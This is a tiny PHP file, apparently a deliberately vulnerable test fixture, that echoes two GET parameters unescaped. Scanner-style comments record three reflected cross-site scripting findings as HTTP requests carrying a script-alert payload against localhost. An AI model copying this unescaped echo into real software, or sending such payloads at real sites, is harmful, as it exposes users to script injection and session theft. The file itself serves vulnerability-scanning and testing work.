<?php
//TODO: AI XSS issue #187, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/187, 4418e781
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-843caa4/vulnerable.php?id2=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
//TODO: AI XSS issue #187, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/187, f9b7bde6
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-843caa4/vulnerable.php?id1=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
//TODO: AI XSS issue #189, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/189, 456dbc10
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-d7244f6/vulnerable.php?id2=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
echo $_GET['id1']." ".$_GET['id2'];
?>
